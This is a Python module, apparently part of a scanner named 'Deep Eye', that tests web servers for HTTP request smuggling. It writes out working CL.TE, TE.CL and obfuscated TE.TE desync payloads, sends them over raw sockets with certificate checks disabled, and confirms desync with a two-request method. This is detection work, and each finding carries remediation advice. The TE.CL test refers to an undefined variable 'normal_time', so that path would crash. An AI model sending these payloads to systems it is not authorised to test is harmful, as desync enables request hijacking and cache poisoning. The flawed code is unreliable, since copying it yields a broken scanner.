"""
HTTP Request Smuggling Tester Module for Deep Eye.

Tests for CL.TE and TE.CL desynchronization vulnerabilities.
"""

import socket
import ssl
import time
from typing import Dict, List, Optional
from urllib.parse import urlparse
import uuid

from utils.logger import get_logger

logger = get_logger(__name__)


class SmugglingTester:
    """Tests for HTTP request smuggling (CL.TE and TE.CL) vulnerabilities."""

    def __init__(self, http_client, config: Dict):
        self.http_client = http_client
        self.config = config
        self.timeout = config.get("scanner", {}).get("timeout", 10)

    def scan(self, url: str, context: Optional[Dict] = None) -> List[Dict]:
        """
        Scan a URL for HTTP request smuggling vulnerabilities.

        Args:
            url: Target URL to test.
            context: Optional context dictionary.

        Returns:
            List of vulnerability dictionaries.
        """
        vulnerabilities = []
        context = context or {}

        logger.info(f"[Smuggling] Testing: {url}")

        parsed = urlparse(url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        use_ssl = parsed.scheme == "https"
        path = parsed.path or "/"

        # Test CL.TE
        result = self._test_cl_te(host, port, path, use_ssl, url)
        if result:
            vulnerabilities.append(result)

        # Test TE.CL
        result = self._test_te_cl(host, port, path, use_ssl, url)
        if result:
            vulnerabilities.append(result)

        # Test TE.TE (obfuscated Transfer-Encoding)
        result = self._test_te_te(host, port, path, use_ssl, url)
        if result:
            vulnerabilities.append(result)

        logger.info(f"[Smuggling] Found {len(vulnerabilities)} potential issues on {url}")
        return vulnerabilities

    def _test_cl_te(self, host: str, port: int, path: str, use_ssl: bool, url: str) -> Optional[Dict]:
        smuggled_body = "0\r\n\r\nG"

        payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(smuggled_body)}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"G"
        )

        confirm_evidence = self._confirm_desync(host, port, path, use_ssl, payload)
        if confirm_evidence:
            return {
                "type": "http_request_smuggling",
                "severity": "critical",
                "url": url,
                "parameter": "Content-Length / Transfer-Encoding",
                "payload": "CL.TE desync: conflicting Content-Length and Transfer-Encoding: chunked",
                "evidence": confirm_evidence,
                "description": (
                    "HTTP Request Smuggling (CL.TE) confirmed. The front-end server uses Content-Length "
                    "while the back-end uses Transfer-Encoding, allowing request desynchronization. "
                    "This can lead to request hijacking, cache poisoning, and security bypass."
                ),
                "remediation": (
                    "Normalize ambiguous requests at the front-end proxy. Reject requests with both "
                    "Content-Length and Transfer-Encoding headers. Use HTTP/2 end-to-end. "
                    "Ensure all servers in the chain parse requests identically."
                ),
            }
        return None

    def _test_te_cl(self, host: str, port: int, path: str, use_ssl: bool, url: str) -> Optional[Dict]:
        payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"5e\r\n"
            f"GPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n"
            f"0\r\n"
            f"\r\n"
        )

        timing_normal = self._measure_request_time(host, port, path, use_ssl, method="POST")
        timing_smuggle = self._send_raw_request(host, port, payload, use_ssl)

        if timing_smuggle is None:
            return None

        response_data, elapsed = timing_smuggle

        confirm_evidence = self._confirm_desync(host, port, path, use_ssl, payload)
        if confirm_evidence:
            return {
                "type": "http_request_smuggling",
                "severity": "critical",
                "url": url,
                "parameter": "Transfer-Encoding / Content-Length",
                "payload": "TE.CL desync: front-end uses TE, back-end uses CL",
                "evidence": confirm_evidence,
                "description": (
                    "HTTP Request Smuggling (TE.CL) potential. The front-end server uses "
                    "Transfer-Encoding while the back-end uses Content-Length, enabling "
                    "request desynchronization and potential request hijacking."
                ),
                "remediation": (
                    "Reject requests containing both Content-Length and Transfer-Encoding. "
                    "Use HTTP/2 end-to-end to eliminate ambiguity. Configure the front-end "
                    "to normalize or reject ambiguous requests before forwarding."
                ),
            }

        if normal_time > 0 and elapsed > normal_time * 3 and elapsed > 5:
            return {
                "type": "http_request_smuggling",
                "severity": "medium",
                "url": url,
                "parameter": "Transfer-Encoding / Content-Length",
                "payload": "TE.CL desync: front-end uses TE, back-end uses CL",
                "evidence": f"TE.CL - Timing anomaly: {elapsed:.2f}s vs normal {normal_time:.2f}s (unconfirmed)",
                "description": (
                    "Potential HTTP Request Smuggling (TE.CL) suspected from timing analysis. "
                    "The front-end server uses Transfer-Encoding while the back-end uses Content-Length. "
                    "Further manual investigation is recommended."
                ),
                "remediation": (
                    "Reject requests containing both Content-Length and Transfer-Encoding. "
                    "Use HTTP/2 end-to-end to eliminate ambiguity. Configure the front-end "
                    "to normalize or reject ambiguous requests before forwarding."
                ),
            }
        return None

    def _test_te_te(self, host: str, port: int, path: str, use_ssl: bool, url: str) -> Optional[Dict]:
        obfuscations = [
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
            "Transfer-Encoding:\tchunked",
            "X: x\r\nTransfer-Encoding: chunked",
            "Transfer-Encoding: chunked\r\n Transfer-Encoding: x",
        ]

        for te_header in obfuscations:
            payload = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 4\r\n"
                f"{te_header}\r\n"
                f"\r\n"
                f"1\r\n"
                f"Z\r\n"
                f"0\r\n"
                f"\r\n"
            )

            result = self._send_raw_request(host, port, payload, use_ssl)
            if result is None:
                continue

            response_data, elapsed = result

            confirm_evidence = self._confirm_desync(host, port, path, use_ssl, payload)
            if confirm_evidence:
                return {
                    "type": "http_request_smuggling",
                    "severity": "critical",
                    "url": url,
                    "parameter": "Transfer-Encoding (obfuscated)",
                    "payload": f"TE.TE desync with obfuscation: {te_header.split(chr(13))[0]}",
                    "evidence": confirm_evidence,
                    "description": (
                        "HTTP Request Smuggling (TE.TE) potential using obfuscated Transfer-Encoding. "
                        "Servers disagree on which Transfer-Encoding header to use, enabling desync."
                    ),
                    "remediation": (
                        "Strictly validate Transfer-Encoding headers. Reject requests with "
                        "multiple or malformed Transfer-Encoding values. Use HTTP/2 to avoid "
                        "header parsing ambiguities."
                    ),
                }

            if elapsed > self.timeout * 0.8:
                return {
                    "type": "http_request_smuggling",
                    "severity": "medium",
                    "url": url,
                    "parameter": "Transfer-Encoding (obfuscated)",
                    "payload": f"TE.TE desync with obfuscation: {te_header.split(chr(13))[0]}",
                    "evidence": f"TE.TE - Timing anomaly: {elapsed:.2f}s (unconfirmed)",
                    "description": (
                        "Potential HTTP Request Smuggling (TE.TE) suspected using obfuscated "
                        "Transfer-Encoding. Further manual investigation is recommended."
                    ),
                    "remediation": (
                        "Strictly validate Transfer-Encoding headers. Reject requests with "
                        "multiple or malformed Transfer-Encoding values. Use HTTP/2 to avoid "
                        "header parsing ambiguities."
                    ),
                }
        return None

    def _send_raw_request(self, host: str, port: int, payload: str, use_ssl: bool) -> Optional[tuple]:
        """Send a raw HTTP request via socket and return (response_data, elapsed_time)."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)

            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)

            start_time = time.time()
            sock.connect((host, port))
            sock.sendall(payload.encode())

            response_data = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response_data += chunk
            except socket.timeout:
                pass

            elapsed = time.time() - start_time
            sock.close()
            return (response_data.decode("utf-8", errors="replace"), elapsed)

        except Exception as e:
            logger.debug(f"[Smuggling] Raw request error: {e}")
            return None

    def _measure_request_time(self, host: str, port: int, path: str, use_ssl: bool, method: str = "GET") -> float:
        """Measure normal request time for baseline comparison."""
        payload = (
            f"{method} {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )
        result = self._send_raw_request(host, port, payload, use_ssl)
        if result:
            return result[1]
        return 0.0

    def _confirm_desync(self, host, port, path, use_ssl, attack_payload):
        """Confirm desync using the two-request technique (PortSwigger standard).

        Sends the attack payload followed by a normal follow-up request on the
        same TCP connection. If the connection is desynchronized, the follow-up
        request will be consumed by the back-end as the start of the smuggled
        prefix, producing TWO or more HTTP responses from a single connection.

        Only http_count >= 2 is accepted as definitive confirmation.
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.connect((host, port))

            followup = f"GET /nonexistent-{uuid.uuid4().hex[:8]}.html HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
            sock.sendall((attack_payload + followup).encode())

            response_data = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response_data += chunk
            except socket.timeout:
                pass
            sock.close()

            text = response_data.decode("utf-8", errors="replace")

            http_count = text.count("HTTP/1.")
            if http_count >= 2:
                return f"Confirmed desync: received {http_count} HTTP responses on single connection"

            return None
        except Exception as e:
            logger.debug(f"[Smuggling] Desync confirmation error: {e}")
            return None

    def _analyze_smuggling_response(
        self, response_data: str, elapsed: float, normal_time: float, technique: str
    ) -> Optional[str]:
        """Analyze response for smuggling indicators."""
        http_count = response_data.count("HTTP/1.")
        if http_count > 1:
            return f"{technique} - Multiple HTTP responses received ({http_count})"
        return None

    def _is_desync_indicator(self, response_data: str, elapsed: float) -> bool:
        """Check if response indicates a desync condition."""
        return response_data.count("HTTP/1.") > 1
